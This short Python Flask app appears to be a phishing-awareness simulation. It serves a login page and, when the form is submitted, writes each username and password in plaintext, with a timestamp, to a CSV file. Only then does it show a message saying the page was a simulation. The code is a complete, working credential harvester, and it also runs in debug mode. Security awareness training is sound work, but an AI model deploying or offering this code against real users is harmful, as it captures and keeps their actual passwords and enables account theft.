from flask import Flask, request, render_template
import csv
from datetime import datetime

app = Flask(__name__)

@app.route('/', methods=['GET'])
def index():
    return render_template('login.html')

@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']

    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    with open('creds.csv', mode='a', newline='') as file:
        writer = csv.writer(file)
        writer.writerow([timestamp, username, password])

    return "<h3>This was a phishing simulation. Always check the URL before entering credentials!</h3>"

if __name__ == "__main__":
    app.run(debug=True)
